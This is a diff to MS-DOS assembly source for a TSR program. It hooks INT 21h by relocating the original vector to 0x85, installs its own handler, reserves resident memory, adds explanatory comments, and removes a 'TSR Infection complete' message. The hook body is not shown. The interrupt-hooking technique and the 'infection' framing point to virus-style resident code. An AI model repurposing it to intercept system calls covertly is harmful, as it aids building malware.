@@ -89,27 +89,54 @@ setup_hook_interrupts:
 	
 	push 	es	
 	pop 	ds
-	mov	dx, bx				;ds:dx now == es:bx (seg:offset of int 21h)
-	mov	ah, 0x25			;; new IVR (interrupt vector routine) installed
+	mov		dx, bx				;ds:dx now == es:bx (seg:offset of int 21h)
+	mov		ah, 0x25			;; new IVR (interrupt vector routine) installed
 	mov 	al, 0x85			;; at IVT[0x85] or Interupt 21
-	int	21h
+	int		21h
 	pop 	es
 
-	mov 	cx, cs
+;******************************************************************************
+; Set the interrupt vector of our target interrupt to point to the TSR routine
+;******************************************************************************
+	mov cx, cs				;;make data addressable
 	mov	ds, cx
-	mov	dx, hook_int			;; address of TSR program passed in ds:dx
+	mov	dx, tsr_hook_int			;; address of TSR program passed in ds:dx
 	mov	ah, 0x25			;; new IVR (interrupt vector routine) installed
-	mov 	al, 0x21			;; at IVT[0x21] or Interupt 21
-	int 	21h
+	mov al, 0x21			;; at IVT[0x21] or Interupt 21
+	int 21h
 
+;******************************************************************************
+; Calculate size of memory to reserve for TSR, using the following values:
+; 256 (0x100) = size of PSP
+;
+; length of program 
+;; [Referencing Ray Duncan's trick for calculating program length
+;; for specifying dx (memsize) of TSR, used in int 21h function 31h call]
+;
+; pgm_len equ $-{function following TSR}-{start of TSR}
+;
+; in this case, 
+;
+; pgm_len	equ	$-setup_hook_interrupts-start	
+; 
+; and the additional adjustment for aligning on a 16-byte paragraph boundary,
+; which can be done by adding 15 to our total program length (program len + 256)
+; and dividing by 16
+;
+; The final formula is as follows:
+; ((256 + pgm_len + 15) / 16)
+						
+; move this memory size into dx
+; call the MS-DOS TSR function with 31 (subfunction number) in AH
+; and return value (0, 1, 2, take your pick) in AL
+;******************************************************************************
 install_tsr:
 	mov	dx, ((256 + setup_hook_interrupts-start + 15) / 16)
 	mov	ax, 0x3102
 	int 	21h
 
-b_msg	db	"TSR Infection complete", 0Dh,0Ah
-b_len	equ	$-b_msg
+pgm_len	equ	$-setup_hook_interrupts-start	;;Referencing Ray Duncan's trick for calculating program length
+						;; for specifying dx (memsize) of TSR, used in int 21h function 31h call
 
 ;;_start	ENDP				;masm specific
-;	;end	_start			;masm specific
-
+;;end	_start			;masm specific
